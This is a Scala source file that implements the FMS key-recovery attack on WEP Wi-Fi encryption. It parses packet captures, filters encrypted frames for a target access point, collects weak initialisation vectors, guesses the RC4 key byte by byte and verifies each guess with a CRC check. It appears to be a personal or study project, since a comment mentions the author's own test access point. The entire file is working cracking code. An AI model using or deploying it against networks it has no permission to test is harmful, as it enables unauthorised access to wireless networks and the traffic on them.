package com.bdwashbu.cat.crack.fms

import com.bdwashbu.cat.model.Packet
import com.bdwashbu.cat.model.IEEE_80211.Wifi
import com.bdwashbu.cat.model.IEEE_80211.QoSMAC
import java.util.zip.CRC32
import com.bdwashbu.cat.model.IEEE_80211
import com.bdwashbu.cat.model.CAPLoader
import java.io.File
import java.nio.ByteBuffer
import scala.collection.mutable.ListBuffer
import com.bdwashbu.cat.model.PacketReader
import com.bdwashbu.cat.model.Endian
import com.bdwashbu.cat.model.IEEE_80211.DataFrame
import scala.annotation.tailrec

object FMS {

  var IVs = Set[IV]()

  var testData: (IV, Array[Byte]) = null
  var totalPackets = 0

  def extractIVs(file: File, accessPoint: IEEE_80211.MACAddress) = {

    val packets = CAPLoader.load(file)

    // We only want packets that:
    //  1.) Have a destination of my test AP (00:24:b2:4e:fe:6c)
    //  2.) Are encrypted using WEP
    //  3.) Is not a retried CCMP packet

    def isUseful(packet: QoSMAC) = (packet.destination == accessPoint || packet.source == accessPoint) && 
                                    packet.frameControl.encrypted &&
                                    packet.seqControl.fragmentNumber == 0 &&
                                    !packet.frameControl.retry
                                    
    
    val usefulPackets = packets.filter { packet =>
      packet.data match {
        case (Wifi(x: QoSMAC, _)) => isUseful(x)
        case _ => false
      }
    }

    totalPackets += usefulPackets.size

    println(usefulPackets.size + " applicable packets found (out of " + packets.length + ")")

    if (testData == null) {
      testData = usefulPackets.filter(packet => 
        packet.data match {
	        case (Wifi(x: QoSMAC, _)) => !x.frameControl.moreFragments
	        case _ => false
	      })(0).data match {
        case (Wifi(x: QoSMAC, _)) => (x.WEP.InitVector, x.payload ++ x.FCS.toArray)
      }
    }

    IVs ++= FMS.getIVs(usefulPackets)
  }

  def attack(fudgeFactor: Int, numberOfBytes: Int, useFakeIVs: Boolean = false) = {

    println(totalPackets + " packets parsed!")
    println("Attacking with " + IVs.size + " total IVs!")

    // To test, we might try adding some self-generated IVs
    val password = Array(0x76, 0xA8, 0xCB, 0xE9, 0xF0).map(_.toByte)
    //IVs = Set()
    if (useFakeIVs)
      IVs ++= getFakeIVs(password)

    var beginTime = System.nanoTime
    val weakIVMap = (0 to 13).map(index => (index, IVs.filter(iv => iv.isWeak(index)))).toMap
    val numWeak = weakIVMap.map(x => x._2.size).sum

    println(numWeak + " weak IVs found!")
    println("Weak IV map created in : " + (System.nanoTime - beginTime) / 1000000 + " ms")

    def crackPassword(): Option[Array[Byte]] = {

      @tailrec
      def findPassword(index: Int, passwordGuesses: Set[Array[Byte]], fudge: Int): Option[Array[Byte]] = {

        var returnVal: Array[Byte] = null

        if (index > numberOfBytes)
          return None

        val weakIVs = weakIVMap(index)

        if (index == numberOfBytes) {

          for (passwordGuess <- passwordGuesses if returnVal == null) {

            val testCipher = RC4(testData._1.toArray, passwordGuess)
            val firstByte = testCipher.decrypt(testData._2(0)) & 0x00FF

            if (firstByte == IEEE_80211.SNAP.header) {

              val cipher = RC4(testData._1.toArray, passwordGuess)
              val testDecryption = cipher.decrypt(testData._2)
              val CRC = testDecryption.takeRight(4)

              val byteBuffer = ByteBuffer.wrap(Array.fill(4)(0.toByte) ++ CRC)

              val checksum = new java.util.zip.CRC32
              checksum.reset
              checksum.update(testDecryption.toArray.dropRight(4))

              val checksumResult = ByteBuffer.allocate(8)
              checksumResult.putLong(checksum.getValue())

              val longVal = byteBuffer.getLong()

              if (checksumResult.array().takeRight(4).reverse.toList == CRC.toList) {
                returnVal = passwordGuess
              }
            }
          }
        }

        if (returnVal == null) {

          val newPasswords = passwordGuesses.par.flatMap { passwordGuess =>

            val guesses = weakIVs.toSeq.flatMap { iv => FMS.getKeyByte(index, iv.value, iv.getFirstKeyByte, passwordGuess) }
            val groupedGuesses = guesses.groupBy(x => x)
            val sortedGuesses = groupedGuesses.map { case (key, value) => (key, value.size) }.toList.sortBy(x => x._2).reverse

            println(sortedGuesses.take(20).toList)
            sortedGuesses.take(1).map(newGuess => passwordGuess :+ newGuess._1.toByte)
          }

          findPassword(index + 1, newPasswords.seq, if (fudge > 1) fudge - 1 else 1)
        } else
          Some(returnVal)
      }

      findPassword(0, Set(Array()), fudgeFactor)
    }

    beginTime = System.nanoTime
    val crackedPassword = crackPassword() match {
      case Some(passBytes) => {
        println("cracked password: " + passBytes.map(_ & 0x00FF).map(_.toHexString).toList)
        println("Password cracked in: " + (System.nanoTime - beginTime) / 1000000 + " milliseconds")
      }
      case None =>
        println("WEP password could not be cracked after " + (System.nanoTime - beginTime) / 1000000 + " milliseconds")
    }

  }

  def mod(x: Int, y: Int): Int = (x % y + y) % y

  def getIVs[T <: Packet](packets: Array[T]): Set[IV] = {
    packets.collect { x => x.data match { case (Wifi(frame: QoSMAC, rawData)) => frame.WEP.InitVector } }.toSet
  }

  def getFakeIVs(password: Array[Byte]): Set[IV] = {
    import java.nio.ByteBuffer

    val IVs = for {
      x <- 3 to 13
      y <- 0 to 255
    } yield Array[Byte](x.toByte, 0xFF.toByte, y.toByte)

    val result = IVs.map { iv =>

      val CRC32 = new CRC32
      CRC32.update(IEEE_80211.SNAP.header)
      val byteBuffer = ByteBuffer.allocate(8)
      byteBuffer.putLong(CRC32.getValue())

      val cipher = RC4(iv, password)
      val encrypted = cipher.encrypt(IEEE_80211.SNAP.header.toByte +: byteBuffer.array().takeRight(4).reverse).toArray

      new IV(ByteBuffer.wrap(Array[Byte](0) ++ iv).getInt, encrypted(0))
    }

    result.toSet
  }

  def getBytes(IV: Int): Array[Byte] = {
    Array(((IV & 0x00FF0000) >> 16).toByte, ((IV & 0x0000FF00) >> 8).toByte, (IV & 0x000000FF).toByte)
  }

  def hasInvalidFormat(packets: Array[Packet]) = {
    packets.map(_.data)
      .collect { case (Wifi(x, _)) => x }
      .zipWithIndex
      .filter { case (frame, _) => frame == null }
      .foreach { case (_, index) => println("Unsupported 802.11 packet format: Packet # " + index) }
  }

  def getKeyByte(N: Int, IV: Int, knownByte: Int, knownPassword: Array[Byte]): Option[Int] = {

    val cipher = RC4(getBytes(IV), knownPassword)
    cipher.ksa(N + 3)

    if (cipher.j < 2) {
      None
    } else
      Some(mod(knownByte - cipher.j - cipher.S(N + 3), 256))
  }

}